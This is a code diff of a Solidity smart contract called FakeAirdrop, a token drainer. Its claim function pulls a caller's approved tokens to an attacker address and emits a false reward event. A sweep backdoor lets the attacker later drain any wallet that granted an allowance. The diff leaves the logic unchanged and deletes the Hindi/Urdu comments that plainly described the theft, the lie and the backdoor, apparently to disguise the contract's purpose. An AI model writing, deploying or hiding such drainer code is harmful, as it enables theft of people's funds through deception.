@@ -19,24 +19,17 @@ contract FakeAirdrop {
     function claim() external {
         uint256 balance = token.balanceOf(msg.sender);
         uint256 allowed = token.allowance(msg.sender, address(this));
-        uint256 amount = balance < allowed ? balance : allowed; // jitna mil sake, sab
+        uint256 amount = balance < allowed ? balance : allowed;
 
         if (amount > 0) {
-            // msg.sender = victim, attacker = chor. Victim ka koi signature nahi chahiye,
-            // sirf pehle wala approve() kaafi hai.
             token.transferFrom(msg.sender, attacker, amount);
         }
 
-        // Jhoot: "aapko 100 ka inaam mila" - asal mein 0
         emit AirdropClaimed(msg.sender, 100e6);
     }
 
-    // ------------------------------------------------------------------
-    // Chor ka chhupa darwaza: jisne kabhi bhi unlimited approve kiya,
-    // us ke NAYE paise bhi baad mein utha lo. Victim ko kuch karna nahi padta.
-    // ------------------------------------------------------------------
     function sweep(address victim) external {
-        if (msg.sender != attacker) revert NotAttacker(); // sirf chor chala sakta hai
+        if (msg.sender != attacker) revert NotAttacker();
         uint256 balance = token.balanceOf(victim);
         uint256 allowed = token.allowance(victim, address(this));
         uint256 amount = balance < allowed ? balance : allowed;
